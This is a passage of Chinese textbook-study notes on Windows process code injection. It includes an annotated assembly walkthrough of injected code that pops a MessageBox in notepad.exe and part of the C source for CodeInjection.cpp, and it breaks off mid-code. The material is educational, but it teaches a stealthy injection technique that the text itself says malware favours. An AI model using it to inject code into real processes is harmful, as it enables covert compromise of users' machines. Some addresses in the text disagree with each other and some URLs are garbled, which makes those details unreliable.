class="headerlink" title="28.6.5 调用 LoadLibraryA（ “user32.dll”）"></a>28.6.5 调用 LoadLibraryA（ “user32.dll”）</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">001C0016    FF16            call dword ptr ds:[esi]; kernel32.LoadLibraryA<br></code></pre></td></tr></table></figure><p>如图28-28所示，ESI寄存器中存储的地址值为1A0000，该地址中保存着LoadLibraryA() API的起始地址（ 77E2DC65 ），请看图28-31。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC28%E7%AB%A0%20%E4%BD%BF%E7%94%A8%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%BC%96%E5%86%99%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81.assets/image-20220224194710002.png" alt="图28-31 ESI寄存器"></p><p>对汇编语言内存引用语法感到陌生的朋友，可以借此机会记住它。为了帮助大家更好地理解这一个过程，我们把上面的CALL指令展开，形式如下（[]类似于C语言中的指针引用）：</p><p>*[ESI]&#x3D;[470000]&#x3D;77E2DC65 （address of kernel32.LoadLibraryA）</p><p>&#x3D;存储在280000地址中的值</p><p>*CALL[ESI]&#x3D;CALL[470000]&#x3D;CALL 77E2DC65 &#x3D;CALL Kernel32.LoadLibraryA</p><p>执行位于1C0016地址处的CALL DWORD PTR DS:[ESI]指令后，就会调用LoadLibraryA() API,同时加载作为参数传入的user32.dll文件。由于notepad.exe进程运行时已经加载了user32.dll，所以它只会返回加载的地址</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC28%E7%AB%A0%20%E4%BD%BF%E7%94%A8%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%BC%96%E5%86%99%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81.assets/image-20220224194754214.png" alt="图28-32 USER32.dll加载地址"></p><p>函数的返回地址保存在EAX中，所以从图28-32中可以看到EAX&#x3D;77D10000。选择OllyDbg菜单中的View-Executable modules[ALT+E]菜单项，可以查看加载到进程内存的所有DLL，如图28-23所示。可以清楚看到，user32.dll的加载地址就是77D10000。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC28%E7%AB%A0%20%E4%BD%BF%E7%94%A8%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%BC%96%E5%86%99%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81.assets/image-20220224194924662.png" alt="图28-33 査看USER32.dll加载地址"></p><h2 id="28-6-6-“MessageBoxA”-字符串"><a href="#28-6-6-“MessageBoxA”-字符串" class="headerlink" title="28.6.6 “MessageBoxA” 字符串"></a>28.6.6 “MessageBoxA” 字符串</h2><p>上面3条PUSH指令将字符串“MessageBoxA”压入栈（与前面将字符串“user32.dll”压入栈的方法相同）。调试到1C0022地址处的PUSH指令，字符串“MessageBoxA”被存储到栈中，如图28-34所示。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">001C0018    68 6F784100     push 0x41786F;&quot;&quot;\0Axo&quot;<br>001C001D    68 61676542     push 0x42656761; &quot;Bega&quot;<br>001C0022    68 4D657373     push 0x7373654D; &quot;sseM&quot;<br></code></pre></td></tr></table></figure><p>上面3条PUSH指令将字符串“MessageBoxA”压入栈（与前面将字符串“user32.dll”压入栈的方法相同）。调试到1C0022地址处的PUSH指令，字符串“MessageBoxA”被存储到栈中，如图28-34所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC28%E7%AB%A0%20%E4%BD%BF%E7%94%A8%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%BC%96%E5%86%99%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81.assets/image-20220224195735412.png" alt="图28-34 存储在栈中的“MessageBoxA”字符串"></p><h2 id="28-6-7-调用-GetProcAddress（hMod-“MessageBoxA”）"><a href="#28-6-7-调用-GetProcAddress（hMod-“MessageBoxA”）" class="headerlink" title="28.6.7 调用 GetProcAddress（hMod, “MessageBoxA”）"></a>28.6.7 调用 GetProcAddress（hMod, “MessageBoxA”）</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">001C0027    54              push esp<br>001C0028    50              push eax                        ; user32.77D10000<br>001C0029    FF56 04         call dword ptr ds:[esi+0x4]     ; kernel32.GetProcAddress<br></code></pre></td></tr></table></figure><p>当前ESP的值为95FF70（参考图28-34 ），所以1C0027地址处的<code>PUSH ESP</code>指令用来将‘MessageBoxA”字符串的地址（95FF70）压入栈（该字符串的地址被用作GetProcAddress() API的第二个参数，在1C0029地址处调用此API）。而当前EAX的值为77D10000,它是user32.dll模块的加载地址（参考图28-32），所以1C0028地址处的<code>PUSH EAX</code>指令用来将user32.dll的起始地址（hMod）压入栈（该字符串的地址被用作GetProcAddress() API的第一个参数，在1C0029地址处调用此API）。调试至此查看栈，如图28-35所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC28%E7%AB%A0%20%E4%BD%BF%E7%94%A8%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%BC%96%E5%86%99%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81.assets/image-20220224200414325.png" alt="图28-35 栈内情形"></p><p>ESI寄存器的值为1A0000,所以可以将[ESI+4]如下展开（参考图28-28、图28-31 ）:</p><p>*[ESI+4]&#x3D;[1A0004]&#x3D;77E2CC94（address of kernel32.GetProcAddress）</p><p>&#x3D;存储在280004地址的值</p><p>*CALL [ESI+4]&#x3D;CALL [1A0004]&#x3D;CALL 77E2CC94&#x3D;CALL Kernel32.GetProcAddress</p><p>所以1C0029地址处的 CALL DWORD PTR DS:[ESI+4]指令用来调用 GetProcAddress（77D10000，“MessageBoxA”）API函数。执行该条CALL指令后，user32.MessageBoxA() API的起始地址就会保存到EAX寄存器（系统环境不同，地址会有所不同。在我的系统环境下，EAX&#x3D;7793EA71 ）,如图28-36所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC28%E7%AB%A0%20%E4%BD%BF%E7%94%A8%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%BC%96%E5%86%99%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81.assets/image-20220224200946995.png" alt="图28-36 MessageBoxA() API的起始地址"></p><h2 id="28-6-8-压入-MessageBoxA-函数的参数1-MB-OK"><a href="#28-6-8-压入-MessageBoxA-函数的参数1-MB-OK" class="headerlink" title="28.6.8 压入 MessageBoxA()函数的参数1 - MB_OK"></a>28.6.8 压入 MessageBoxA()函数的参数1 - MB_OK</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">001C002C    6A 00           push 0x0<br></code></pre></td></tr></table></figure><p>PUSH 0指令将0压入栈，0为MessageBoxA() API （后面会调用该API）的第四个参数（uType ）MessageBoxA() API共有4个参数，函数原型如代码28-3所示。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">MessageBox</span><span class="hljs-params">(</span><br><span class="hljs-params">HWND hWnd,</span><br><span class="hljs-params"> <span class="hljs-comment">// handle of owner window</span></span><br><span class="hljs-params">LPCTSTR lpText,</span><br><span class="hljs-params"> <span class="hljs-comment">// address of text in message box </span></span><br><span class="hljs-params">LPCTSTR lpCaption,</span><br><span class="hljs-params"> <span class="hljs-comment">// address of title of message box</span></span><br><span class="hljs-params">UINT uType</span><br><span class="hljs-params"> <span class="hljs-comment">// style of message box</span></span><br><span class="hljs-params">)</span>;<br></code></pre></td></tr></table></figure><blockquote><p>uType值为0，表示弹出的消息对话框为MB_OK，仅显示一个OK （确定）按钮。</p></blockquote><h2 id="28-6-9-压入-MessageBoxA-函数的参数2-“ReverseCore”"><a href="#28-6-9-压入-MessageBoxA-函数的参数2-“ReverseCore”" class="headerlink" title="28.6.9 压入 MessageBoxA()函数的参数2 - “ReverseCore”"></a>28.6.9 压入 MessageBoxA()函数的参数2 - “ReverseCore”</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs assembly">001C002E    E8 0C000000     call 001C003F<br>001C0033    52              push edx<br>001C0034    65:76 65        jbe short 001c009c<br>001C0037    72 73           jb short 001C00AC<br>001C0039    65:43           inc ebx<br>001C003B    6f              outs dx,dword ptr ds:[esi]<br>001C003C    72 65           jb short 001C00A3<br>001C003E    00E8            add al,ch<br></code></pre></td></tr></table></figure><p>下面介绍“使用CALL指令将包含在代码间的字符串数据地址压入栈”的技术，该技术也仅能用在使用汇编语言编写的程序中。很明显，1C0033~1C003E地址区域是程序代码区域，但其内容实为“ReverseCore”字符串数据。也就是说，“ReverseCore”字符串的首地址为1C0033,它被用作MessageBoxA() API的第三个参数（lpCaption ）。</p><p>将字符串作为参数传递给函数前，需要先把字符串地址压入栈，那么采用哪种方式好呢？继续调试位于1C002E地址处的CALL指令（StepIn（F7）），查看栈，如图28-37所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC28%E7%AB%A0%20%E4%BD%BF%E7%94%A8%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%BC%96%E5%86%99%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81.assets/image-20220224202045773.png" alt="图28-37 1C003F代码"></p><p>从栈中可以看到，“ReverseCore”字符串的起始地址1C0033被压入其中。也就是说，MessageBoxA()的第三个参数被压入栈。这个“花招”巧妙运用了CALL指令的“动作原理”。执 行1C0033地址处的CALL指令后，函数（1C003F ）终止并将返回地址（ 1C0033 ）压入（PUSH） 栈，然后再跳转到（JMP）相应的函数地址（1C003F）。也就是说，执行一条CALL指令相当于执行了PUSH与JMP两条指令。但1C003F实际并不是函数，不具有以RETN指令返回的形态。此处的CALL指令只是用来将紧接其后的“ReverseCore”字符串地址压入栈，然后转到下一条代码指令。大家现在应该理解这个很有意思的CALL指令用法了。</p><h2 id="28-6-10-压入-MessageBoxA-函数的参数3-“www-reversecore-com”"><a href="#28-6-10-压入-MessageBoxA-函数的参数3-“www-reversecore-com”" class="headerlink" title="28.6.10 压入 MessageBoxA()函数的参数3 - “www.reversecore.com”"></a>28.6.10 压入 MessageBoxA()函数的参数3 - “<a href="http://www.reversecore.com”/">www.reversecore.com”</a></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs assembly">001C003F    E8 14000000     call 001C0058<br>001C0044    77 77           ja short 001C00BD<br>001C0046    77 2E           ja short 001C0076<br>001C0048    72 65           jb short 001C00AF<br>001C004A    76 65           jbe short 001C00B1<br>001C004C    72 73           jb short 001C00C1<br>001C004E    65:636F 72      arpl word ptr gs:[edi+0x72],bp<br>001C0052    65              gs:<br>001C0053    2E:636F 6D      arpl word ptr cs:[edi+0x6D],bp<br>001C0057    006A 00         add byte ptr ds:[edx],ch<br></code></pre></td></tr></table></figure><p>与“ReverseCore”字符串类似，上面的代码将MessageBoxA() API的第二个参数lpText字符串 （“<a href="http://www.reversecore.com”)压入栈.上述代码中的1c0044~1c0057地址区域并非代码指令,而是字符串数据(“www.reversecore.com”)./">www.reversecore.com”）压入栈。上述代码中的1C0044~1C0057地址区域并非代码指令，而是字符串数据（“www.reversecore.com”）。</a></p><p>1C003F地址处的CALL指令（与前面说明的一样）将紧接其后的“<a href="http://www.reversecore.com”字符串的地址(1c0044/">www.reversecore.com”字符串的地址（1C0044</a> ）压入栈，然后转到下一条指令的地址处（1C0058 ）（参考图28-38 ）。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC28%E7%AB%A0%20%E4%BD%BF%E7%94%A8%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%BC%96%E5%86%99%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81.assets/image-20220224202636373.png" alt="图28-38"></p><h2 id="28-6-11-压入-MessageBoxA-函数的参数4-NULL"><a href="#28-6-11-压入-MessageBoxA-函数的参数4-NULL" class="headerlink" title="28.6.11 压入 MessageBoxA()函数的参数4 -NULL"></a>28.6.11 压入 MessageBoxA()函数的参数4 -NULL</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">001C0058    6A 00           push 0x0<br></code></pre></td></tr></table></figure><p>上面这条指令将MessageBoxA() API的第一个参数hWnd压入栈，该参数用来确定消息对话框所属的窗口句柄，这里压入NULL值，创建一个不属于任何窗口的消息对话框。</p><h2 id="28-6-12-调用-MessageBoxA"><a href="#28-6-12-调用-MessageBoxA" class="headerlink" title="28.6.12 调用 MessageBoxA()"></a>28.6.12 调用 MessageBoxA()</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">001C005A    FFD0            call eax       ; user32.MessageBoxA<br></code></pre></td></tr></table></figure><p>上面这条CALL指令调用MessageBoxA() API。指令中的EAX寄存器存储着MessageBoxA()API的起始地址（77D6EA11），该地址是前面调用GetProcAddress()后返回的值（参考图28-36、图28-38）。调试1C005A地址处的<code>CALL EAX</code>指令后，查看寄存器与栈，如图28-39所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC28%E7%AB%A0%20%E4%BD%BF%E7%94%A8%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%BC%96%E5%86%99%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81.assets/image-20220224203059310.png" alt="图28-39 调用MessageBoxA()"></p><p>执行<code>CALL EAX</code>指令即可弹出消息对话框，如图28-40所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC28%E7%AB%A0%20%E4%BD%BF%E7%94%A8%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%BC%96%E5%86%99%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81.assets/image-20220224203131442.png" alt="图28-40 消息对话框"></p><h2 id="28-6-13-设置ThreadProc-函数的返回值"><a href="#28-6-13-设置ThreadProc-函数的返回值" class="headerlink" title="28.6.13 设置ThreadProc()函数的返回值"></a>28.6.13 设置ThreadProc()函数的返回值</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">001C005C    33C0            xor eax,eax<br></code></pre></td></tr></table></figure><p>注入notepad.exe进程的代码（ThreadProc()线程函数）执行完之前，还需要做一些准备工作，即用<code>XOR EAX,EAX</code>指令将线程函数的返回值设置为0。前面学过函数的返回值使用EAX寄存器，各位还记得吧？</p><blockquote><p><code>XOR EAX,EAX</code>指令能够又快又好地将EAX寄存器初始化为0（对CPU而言，它比使用MOV EAX，0指令更简单快捷）。</p></blockquote><h2 id="28-6-14-删除栈帧及函数返回"><a href="#28-6-14-删除栈帧及函数返回" class="headerlink" title="28.6.14 删除栈帧及函数返回"></a>28.6.14 删除栈帧及函数返回</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">001C005E    8BE5            mov esp,ebp<br>001C0060    5D              pop ebp<br>001C0061    C3              retn<br></code></pre></td></tr></table></figure><p>最后，删除ThreadProc()函数开始时生成的栈帧，并使用RETN命令返回函数。栈帧在ThreadProc()函数中非常重要。对于前面使用PUSH指令压入栈的字符串，我们不需要费力地用POP命令逐个弹岀，只要使用上面几条删除栈帧的指令即可快速恢复原状。</p><h1 id="28-7-小结"><a href="#28-7-小结" class="headerlink" title="28.7 小结"></a>28.7 小结</h1><p>对使用汇编语言编写的注入代码的说明到此结束。使用汇编语言编写程序要比使用c语言更加灵活自由，强烈建议大家尝试使用汇编语言编写更多更具创意的代码。对于刚接触汇编语言不久的朋友，我建议使用OllyDbg中的汇编指令，用它编写汇编代码更容易。</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>《逆向工程核心原理》 第28章</p>]]></content>
    
    
    <categories>
      
      <category>Binary</category>
      
      <category>逆向工程核心原理</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Binary</tag>
      
      <tag>逆向工程核心原理</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>第27章 代码注入</title>
    <link href="/1999/02/25/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/%E7%AC%AC27%E7%AB%A0%20%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/"/>
    <url>/1999/02/25/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/%E7%AC%AC27%E7%AB%A0%20%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<p>第27章代码注入<br>本章将讲解代码注入（CodeInjection）相关技术，并借助一个练习示例向各位展示代码注入的实施原理与方法。通过比较分析，了解代码注入与DLL注入的不同点。 </p><h1 id="27-1-代码注入"><a href="#27-1-代码注入" class="headerlink" title="27.1 代码注入"></a>27.1 代码注入</h1><p>代码注入是一种向目标进程插入独立运行代码并使之运行的技术，它一般调用CreateRemoteThread()API以远程线程形式运行插入的代码，所以也被称为线程注入。图27-1描述了代码注入技术的实现原理。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC27%E7%AB%A0%20%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5.assets/image-20220222212410514.png" alt="图27-1 代码注入"></p><p>首先向目标进程target.exe插入代码与数据，在此过程中，代码以线程过程（Thread Procedure ）形式插入，而代码中使用的数据则以线程参数的形式传入。也就是说，代码与数据是分別注入的。如上所言，代码注入的原理非常简单，但具体实现过程中有一些内容必须注意。下面就通过与DLL注入比较来讲解实现代码注入的注意事项。</p><h1 id="27-2-DLL注入与代码注入"><a href="#27-2-DLL注入与代码注入" class="headerlink" title="27.2 DLL注入与代码注入"></a>27.2 DLL注入与代码注入</h1><p>请看下面这段简单的代码，它用来弹出Windows消息框。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">DWORD WINAPI <span class="hljs-title function_">ThreadProc</span><span class="hljs-params">(LPVOID lPa ram)</span><br>&#123;<br>MessageBoxA(<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;www.reversecore.com”, &quot;</span>ReverseCore”, MBOK);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>若使用DLL注入技术，则需要先把上述代码放入某个DLL文件，然后再将整个DLL文件注入目标进程。采用该技术完成注入后，运行OllyDbg调试器，查看上述ThreadProc()代码区域，如图27-2所示。</p><p>请注意图27-2代码中使用的地址。首先，10001002地址处有一条PUSH 10009290指令，紧接其下的是PUSH 1000929C指令。在OllyDbg的内存Dump窗口中查看地址10009290与1000929C，如 图27-3所示。</p><p>从图27-3中可以看到，这2个地址（10009290与1000929C）分别指向DLL数据节区中的字符串（“ReverseCore”、“<a href="http://www.reversecore.com”).上面2条push指令将messageboxa()/">www.reversecore.com”）。上面2条PUSH指令将MessageBoxA()</a> API中要使用<br>的字符串（“ReverseCore”、“<a href="http://www.reversecore.com”)的地址存储到栈.继续看图27-2,1000100e地址处有一条call/">www.reversecore.com”）的地址存储到栈。继续看图27-2，1000100E地址处有一条CALL</a> DWORD PTR DS:[100080F0]指令，该CALL指令即是调用user32!MessageBoxA() API的命令，转到100080F0地址处查看，如图27-4所示。</p><p>从图27-4可知，100080F0地址就是DLL的IAT区域（在其上方可以看到其他API的地址）。像这样，DLL代码中使用的所有数据均位于DLL的数据区域。釆用DLL注入技术时，整个DLL会被插入目标进程，代码与数据共存于内存，所以代码能够正常运行。与此不同，代码注入仅向目标进程注入必要的代码（图27-2 ），要想使注入的代码正常运行，还必须将代码中使用的数据（图 27-3、图27-4） —同注入（并且要通过编程将已注入数据的地址明确告知代码）。基于这种原因，使用代码注入技术时要考虑的事项比使用DLL注入技术要多得多。通过分析后面示例的代码，大家可以更准确地把握。</p><p><strong>使用代码注入的原因</strong></p><p>其实，代码注入要实现的功能与DLL注入类似，但具体实施时要考虑的事项更多，使用起来更加不便。那它的优点究竟是什么呢？</p><ol><li><p>占用内存少<br>如果要注入的代码与数据较少，那么就不需要将它们做成DLL的形式再注入。此时直接采用<br>代码注入的方式同样能够获得与DLL注入相同的效果，且占用的内存会更少。</p></li><li><p>难以查找痕迹<br>采用DLL注入方式会在目标进程的内存中留下相关痕迹，很容易让入判断出目标进程是否被执行过注入操作。但采用代码注入方式几乎不会留下任何痕迹（当然也有一些方法可以检测），因此恶意代码中大量使用代码注入技术。</p></li><li><p>其他<br>不需要另外的DLL文件，只要有代码注入程序即可。大家刚开始会觉得代码注入技术生疏，熟悉之后就会觉得简单好用。</p></li></ol><p>简单归纳一下：DLL注入技术主要用在代码量大且复杂的时候，而代码注入技术则适用于代码量小且简单的情况。</p><h1 id="27-3-练习示例"><a href="#27-3-练习示例" class="headerlink" title="27.3 练习示例"></a>27.3 练习示例</h1><p>本节我们学习一个代码注入示例（CodeInjection.exe）,用它向notepad.exe进程注入简单的代<br>码，注入后会弹出消息框。</p><h2 id="27-3-1-运行-notepad-exe"><a href="#27-3-1-运行-notepad-exe" class="headerlink" title="27.3.1 运行 notepad.exe"></a>27.3.1 运行 notepad.exe</h2><p>首先运行notepad.exe，然后使用Process Explorer查看notepad.exe进程的PID，如图27-5所示。</p><p>我的测试环境中，notepad.exe的PID为2036。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC27%E7%AB%A0%20%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5.assets/image-20220223111217390.png" alt="图27-5 査看notepad.exe的PID"></p><h2 id="27-3-2-运行-CodeInjection-exe"><a href="#27-3-2-运行-CodeInjection-exe" class="headerlink" title="27.3.2 运行 CodeInjection.exe"></a>27.3.2 运行 CodeInjection.exe</h2><p>在命令行窗口中输入命令与参数（notepad.exe的PID ），运行CodeInjection.exe文件，如图27-6所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC27%E7%AB%A0%20%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5.assets/image-20220223111344107.png" alt="图27-6 运行CodeInjection.exe"></p><h2 id="27-3-3-弹出消息框"><a href="#27-3-3-弹出消息框" class="headerlink" title="27.3.3 弹出消息框"></a>27.3.3 弹出消息框</h2><p>notepad.exe进程中弹岀一个消息框，如图27-7所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC27%E7%AB%A0%20%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5.assets/image-20220223111410928.png" alt="图27-7 弹岀消息框"></p><blockquote><p>弹出的消息框可能位于notepad.exe窗口的下方，查看时请注意。</p></blockquote><p>接下来看示例的源代码，仔细分析代码注入是如何实现的。</p><h1 id="27-4-Codelnjection-cpp"><a href="#27-4-Codelnjection-cpp" class="headerlink" title="27.4 Codelnjection.cpp"></a>27.4 Codelnjection.cpp</h1><p>为便于说明，下面即将介绍的源代码略去了异常处理部分，完整代码请参考本书源代码中的Codelnjection.cpp文件。</p><blockquote><p>Codelnjection.cpp 使用 VC-H- 2010 Express Edition 工具编写而成，在 Windows XP&#x2F;7 32位系统中通过测试。</p></blockquote><h2 id="27-4-1-main-函数"><a href="#27-4-1-main-函数" class="headerlink" title="27.4.1 main()函数"></a>27.4.1 main()函数</h2><p>首先看一下main()函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> *argv[])</span><br>&#123;<br>    DWORD dwPID     = <span class="hljs-number">0</span>;<br><br><span class="hljs-keyword">if</span>( argc != <span class="hljs-number">2</span> )<br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n USAGE  : %s &lt;pid&gt;\n&quot;</span>, argv[<span class="hljs-number">0</span>]);<br><span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-comment">// change privilege</span><br><span class="hljs-keyword">if</span>( !SetPrivilege(SE_DEBUG_NAME, TRUE) )<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br><br>    <span class="hljs-comment">// code injection</span><br>    dwPID = (DWORD)atol(argv[<span class="hljs-number">1</span>]);<br>    InjectCode(dwPID);<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>main()函数用来调用InjectCode()函数，传入的函数参数为目标进程的PID。</p><h2 id="27-4-2-ThreadProc-函数"><a href="#27-4-2-ThreadProc-函数" class="headerlink" title="27.4.2 ThreadProc()函数"></a>27.4.2 ThreadProc()函数</h2><p>分析InjectCode()函数之前，先看一下要注入目标进程的代码（线程函数）。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">THREAD_PARAM</span> </span><br><span class="hljs-class">&#123;</span><br>    FARPROC pFunc[<span class="hljs-number">2</span>];               <span class="hljs-comment">// LoadLibraryA(), GetProcAddress()</span><br>    <span class="hljs-type">char</span>    szBuf[<span class="hljs-number">4</span>][<span class="hljs-number">128</span>];          <span class="hljs-comment">// &quot;user32.dll&quot;, &quot;MessageBoxA&quot;, &quot;www.reversecore.com&quot;, &quot;ReverseCore&quot;</span><br>&#125; THREAD_PARAM, *PTHREAD_PARAM;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-title function_">HMODULE</span> <span class="hljs-params">(WINAPI *PFLOADLIBRARYA)</span><br><span class="hljs-params">(</span><br><span class="hljs-params">    LPCSTR lpLibFileName</span><br><span class="hljs-params">)</span>;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-title function_">FARPROC</span> <span class="hljs-params">(WINAPI *PFGETPROCADDRESS)</span><br><span class="hljs-params">(</span><br><span class="hljs-params">    HMODULE hModule,</span><br><span class="hljs-params">    LPCSTR lpProcName</span><br><span class="hljs-params">)</span>;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-title function_">int</span> <span class="hljs-params">(WINAPI *PFMESSAGEBOXA)</span><br><span class="hljs-params">(</span><br><span class="hljs-params">    HWND hWnd,</span><br><span class="hljs-params">    LPCSTR lpText,</span><br><span class="hljs-params">    LPCSTR lpCaption,</span><br><span class="hljs-params">    UINT uType</span><br><span class="hljs-params">)</span>;<br><br>DWORD WINAPI <span class="hljs-title function_">ThreadProc</span><span class="hljs-params">(LPVOID lParam)</span><br>&#123;<br>    